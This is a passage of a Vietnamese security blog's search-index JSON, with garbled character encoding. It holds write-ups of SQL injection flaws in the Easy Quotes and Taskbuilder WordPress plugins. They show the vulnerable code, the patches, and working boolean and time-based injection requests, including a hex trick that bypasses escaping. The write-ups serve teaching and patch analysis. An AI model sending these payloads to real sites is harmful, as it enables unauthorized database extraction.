php.ini (náº¿u cÃ³ quyá»n server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Sá»­a file .htaccess (náº¿u dÃ¹ng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 ThÃªm vÃ o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); ğŸ‘‰ Lá»i khuyÃªn: Chá»‰ nÃªn Ä‘áº·t giá»›i háº¡n vá»«a Ä‘á»§ (64MB hoáº·c 128MB). TrÃ¡nh Ä‘áº·t quÃ¡ lá»›n Ä‘á»ƒ háº¡n cháº¿ nguy cÆ¡ bá»‹ upload file náº·ng gÃ¢y quÃ¡ táº£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦\u003c/li\u003e\n\u003cli\u003eHiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eCÃ³ 2 phiÃªn báº£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Easy Quotes cá»§a WordPress trÆ°á»›c phiÃªn báº£n 1.2.3. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) vÃ  v1.2.3(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  khÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡ khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nBáº£n vÃ¡ sá»­ dá»¥ng $wpdb-\u0026gt;prepare() thay vÃ¬ truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } CÃ³ nhiá»u hÃ m cÅ©ng Ä‘Æ°á»£c vÃ¡ báº±ng cÃ¡ch trÃªn, nhÆ°: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() Ä‘Ã£ Ä‘Æ°á»£c vÃ¡ nhÆ°ng nÃ³ khÃ´ng chá»©a dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng, nÃªn khÃ´ng cáº§n quan tÃ¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } How it work? Ta khai thÃ¡c lá»—i SQL Injection trong hÃ m get_family_data($family), cÃ¡c hÃ m cÃ²n láº¡i khai thÃ¡c tÆ°Æ¡ng tá»±.\nget_family_data() lÃ  hÃ m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } get_family_data() Ä‘Æ°á»£c gá»i trong 2 hÃ m get_family() vÃ  get_font_variants() cá»§a class Quotes_Data, Ä‘á»ƒ biáº¿t chÃºng sá»­ dá»¥ng á»Ÿ Ä‘Ã¢u, ta tÃ¬m kiáº¿n vá»›i tá»« khÃ³a get_family hoáº·c get_font_variants\nHÃ m get_font_variants() Ä‘Æ°á»£c gá»i trong hÃ m rest_route_callback_font_variants() cá»§a class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } HÃ m khá»Ÿi táº¡o cá»§a class Quotes_Rest_Route sá»­ dá»¥ng add_action(hook_name, callback) vá»›i hook_name lÃ  rest_api_init Ä‘á»ƒ Ä‘Äƒng kÃ½ cÃ¡c endpoint tÃ¹y chá»‰nh vá»›i REST API System cá»§a WordPress\nCallback rest_api_init sá»­ dá»¥ng register_rest_route nhiá»u láº§n Ä‘á»ƒ táº¡o cÃ¡c endpoint dÆ°á»›i namespace layart/v1\nrest_route_callback_font_variants lÃ  callback cá»§a endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family máº·c Ä‘á»‹nh lÃ  Shadows Into Light náº¿u khÃ´ng Ä‘Æ°á»£c truyá»n trong param.\nExploit Detect SQLi Ta thá»­ ká»¹ thuáº­t Boolean-based SQL Injection Ä‘á»ƒ kiá»ƒm tra xem tham sá»‘ family cÃ³ dá»… bá»‹ chÃ¨n lá»‡nh SQL hay khÃ´ng.\nTrue request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='1' luÃ´n Ä‘Ãºng =\u0026gt; query há»£p lá»‡, tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng.\nFalse request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='2' luÃ´n sai =\u0026gt; query khÃ´ng khá»›p =\u0026gt; tráº£ vá» [].\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nDatabase name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w {: .prompt-info }\nResponse tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng =\u0026gt; kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w\nKhi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Conclusion Lá»— há»•ng CVE-2025-26943 trong plugin WordPress Easy Quotes trÆ°á»›c phiÃªn báº£n 1.2.3 xuáº¥t phÃ¡t tá»« viá»‡c khÃ´ng sá»­ dá»¥ng cÆ¡ cháº¿ chuáº©n bá»‹ truy váº¥n ($wpdb-\u0026gt;prepare) mÃ  truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u lá»‡nh SQL dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nBáº£n vÃ¡ chÃ­nh thá»©c Ä‘Ã£ thay tháº¿ viá»‡c ná»‘i chuá»—i báº±ng cÃ¡ch dÃ¹ng $wpdb-\u0026gt;prepare, giÃºp Ä‘áº£m báº£o dá»¯ liá»‡u Ä‘áº§u vÃ o Ä‘Æ°á»£c kiá»ƒm soÃ¡t vÃ  an toÃ n hÆ¡n.\nKey takeaways:\nLuÃ´n sá»­ dá»¥ng $wpdb-\u0026gt;prepare() khi lÃ m viá»‡c vá»›i database trong WordPress Ä‘á»ƒ trÃ¡nh SQL Injection. ThÆ°á»ng xuyÃªn cáº­p nháº­t plugin vÃ  kiá»ƒm tra báº£o máº­t Ä‘á»ƒ trÃ¡nh trá»Ÿ thÃ nh má»¥c tiÃªu táº¥n cÃ´ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-23-cve-2025-26943/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) vÃ  v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  \u003cstrong\u003ekhÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡\u003c/strong\u003e khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Taskbuilder cá»§a WordPress trÆ°á»›c phiÃªn báº£n 4.0.2. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) vÃ  v4.0.2(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ xá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n '...'. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° OR, AND,...) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/admin/projects/get_users.php\nTrong phiÃªn báº£n v4.0.1, biáº¿n $proj_id sau khi escape Ä‘Æ°á»£c Ä‘Æ°a tháº³ng vÃ o cÃ¢u truy váº¥n mÃ  khÃ´ng cÃ³ dáº¥u nhÃ¡y Ä‘Æ¡n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); á» báº£n v4.0.2, truy váº¥n Ä‘Ã£ Ä‘Æ°á»£c Ä‘iá»u chá»‰nh báº±ng cÃ¡ch Ä‘áº·t $proj_id trong dáº¥u nhÃ¡y Ä‘Æ¡n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); Báº£n vÃ¡ nÃ y Ä‘áº£m báº£o ráº±ng giÃ¡ trá»‹ $proj_id sau khi escape Ä‘Æ°á»£c coi lÃ  má»™t chuá»—i literal, khÃ´ng thá»ƒ thoÃ¡t ra khá»i dáº¥u nhÃ¡y Ä‘Æ¡n Ä‘á»ƒ chÃ¨n thÃªm cÃº phÃ¡p SQL, qua Ä‘Ã³ ngÄƒn cháº·n táº¥n cÃ´ng SQL Injection.\nHow it work? File architecture:\nCáº¥u trÃºc chung cá»§a file hiá»‡n táº¡i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o ná»™i dung chÃ­nh (body) cá»§a modal ob_start(); // ... render HTML danh sÃ¡ch users $body = ob_get_clean(); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o pháº§n footer cá»§a modal ob_start(); // ... render HTML cÃ¡c nÃºt thao tÃ¡c (Close, Save) $footer = ob_get_clean(); // Tráº£ dá»¯ liá»‡u JSON Ä‘á»ƒ frontend hiá»ƒn thá»‹ modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Láº¥y dá»¯ liá»‡u project tá»« database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay vÃ¬ xuáº¥t trá»±c tiáº¿p, giÃºp gom ná»™i dung vÃ o biáº¿n. $body / $footer: Chá»©a ná»™i dung HTML Ä‘á»™ng cá»§a modal. json_encode(): Tráº£ JSON cho client, cÃ³ kháº£ nÄƒng Ä‘Æ°á»£c sá»­ dá»¥ng trong Ajax Ä‘á»ƒ hiá»ƒn thá»‹ modal mÃ  khÃ´ng cáº§n refresh trang. File náº±m trong thÆ° má»¥c includes cho tháº¥y ráº±ng nÃ³ sáº½ Ä‘Æ°á»£c gá»i á»Ÿ 1 chá»©c nÄƒng nÃ o Ä‘Ã³ á»Ÿ nÆ¡i khÃ¡c. Äá»ƒ biáº¿t chá»©c nÄƒng nÃ o sá»­ dá»¥ng nÃ³, ta tÃ¬m kiáº¿m vá»›i tá»« khÃ³a get_users.php trong thÆ° má»¥c chá»©a plugin.\nğŸ‘‰ NÃ³ Ä‘Æ°á»£c include trong hÃ m wppm_get_users() cá»§a class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() lÃ  callback cá»§a action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. wp_ajax_wppm_get_users lÃ  tÃªn hook Ajax, vá»›i quy táº¯c Ä‘áº·t tÃªn: wp_ajax_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user Ä‘Ã£ Ä‘Äƒng nháº­p. wp_ajax_nopriv_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user chÆ°a Ä‘Äƒng nháº­p. á» Ä‘Ã¢y, action = wppm_get_users. NghÄ©a lÃ  náº¿u trong Ajax request báº¡n gá»­i action=wppm_get_users tá»›i admin-ajax.php, thÃ¬ WordPress sáº½ tÃ¬m callback tÆ°Æ¡ng á»©ng Ä‘á»ƒ xá»­ lÃ½, á»Ÿ Ä‘Ã¢y lÃ  wppm_get_users(). ğŸ‘‰ Ta Ä‘Ã£ biáº¿t Ä‘Æ°á»£c action = wppm_get_users, kiá»ƒm tra xem Ajax nÃ o sá»­ dá»¥ng action nÃ y báº±ng cÃ¡ch tÃ¬m tá»« khÃ³a wppm_get_users trÃªn cÃ¡c file .js trong thÆ° má»¥c chá»©a plugin.\nAction wppm_get_users lÃ  pháº§n data trong request POST cá»§a hÃ m wppm_get_users()\nHÃ m wppm_get_users() sáº½ Ä‘Æ°á»£c Ä‘áº·t trong HTML attribute cá»§a chá»©c nÄƒng project\nTáº¡o project má»›i Truy cáº­p vÃ o project Ä‘Ã³ Inspect code vÃ  tÃ¬m hÃ m wppm_get_users sáº½ Ä‘Æ°á»£c Ä‘áº·t á»Ÿ Ä‘Ã¢u, hÃ nh Ä‘á»™ng nÃ o sáº½ gá»i nÃ³ ğŸ‘‰ Khi click vÃ o icon bÃªn cáº¡nh Users ajax sáº½ hoáº¡t Ä‘á»™ng, gá»­i request Ä‘áº¿n server, láº¥y danh sÃ¡ch cÃ¡c user tham gia project vÃ  mÃ£ HTML hiá»ƒn thá»‹ nÃ³.\nExploit Detect SQLi Báº¯t request báº±ng BurpSuite, gá»­i request vá»›i SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id Ä‘Ãºng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w tÆ°Æ¡ng á»©ng vá»›i mÃ£ HEX lÃ  0x77\nSá»­ dá»¥ng SUBSTRING(STRING,1,1) Ä‘á»ƒ láº¥y kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a chuá»—i\ná» Ä‘Ã¢y, $proj_id báº±ng 4 vÃ¬ SUBSTRING('wordpress',1,1)=0x77 lÃ  Ä‘Ãºng nÃªn SELECT láº¥y giÃ¡ trá»‹ Ä‘Ãºng trong IF(condition, value if true, value if false), 4 lÃ  giÃ¡ trá»‹ cÃ³ thá»±c trong database, nÃªn response tráº£ vá» chá»©a danh sÃ¡ch ngÆ°á»i tham gia dá»± Ã¡n\nSá»­ dá»¥ng HEX technique Ä‘á»ƒ bypass hÃ m esc_sql() á»Ÿ trÃªn, dÃ¹ng Ä‘á»ƒ so sÃ¡nh khi khÃ´ng sá»­ dÃ¹ng Ä‘Æ°á»£c '\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) Vá»›i proj_id khÃ´ng cÃ³ thá»±c trong database, response sáº½ tráº£ vá» káº¿t quáº£ chá»©a None\nğŸ‘‰ Ta Ä‘Ã£ láº¥y Ä‘Æ°á»£c kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a database name báº±ng ká»¹ thuáº­t boolean base\nproj_id Ä‘Ã¹ng: response khÃ´ng chá»©a None proj_id sai: response chá»©a None CÃ³ thá»ƒ sá»­ dá»¥ng ká»¹ thuáº­t time base nhÆ°ng khi dump sá»‘ lÆ°á»£ng lá»›n data, thá»i gian dump sáº½ ráº¥t lÃ¢u\nConclusion Lá»— há»•ng CVE-2025-39569 trong plugin WordPress Taskbuilder xuáº¥t phÃ¡t tá»« viá»‡c thiáº¿u dáº¥u nhÃ¡y Ä‘Æ¡n '...' bao quanh dá»¯ liá»‡u Ä‘áº§u vÃ o trong cÃ¢u lá»‡nh SQL, khiáº¿n dá»¯ liá»‡u ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ Ä‘Æ°á»£c diá»…n giáº£i nhÆ° má»™t pháº§n cá»§a cÃ¢u lá»‡nh SQL há»£p lá»‡.\nBáº£n vÃ¡ á»Ÿ phiÃªn báº£n 4.0.2 Ä‘Ã£ kháº¯c phá»¥c váº¥n Ä‘á» báº±ng cÃ¡ch Ä‘Æ°a $proj_id vÃ o trong '...', Ä‘áº£m báº£o nÃ³ luÃ´n Ä‘Æ°á»£c xá»­ lÃ½ nhÆ° má»™t literal string trong SQL.\nKey takeaways:\nÆ¯u tiÃªn sá»­ dá»¥ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay vÃ¬ tá»± chÃ¨n dá»¯ liá»‡u vÃ o query. Äá»‘i vá»›i cÃ¡c plugin WordPress, cáº§n test ká»¹ lÆ°á»¡ng cÃ¡c Ajax endpoint vÃ¬ Ä‘Ã¢y lÃ  nÆ¡i dá»… xuáº¥t hiá»‡n SQLi vÃ  XSS nháº¥t. NgÆ°á»i quáº£n trá»‹ cáº§n thÆ°á»ng xuyÃªn cáº­p nháº­t plugin/theme Ä‘á»ƒ nháº­n báº£n vÃ¡ ká»‹p thá»i. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca 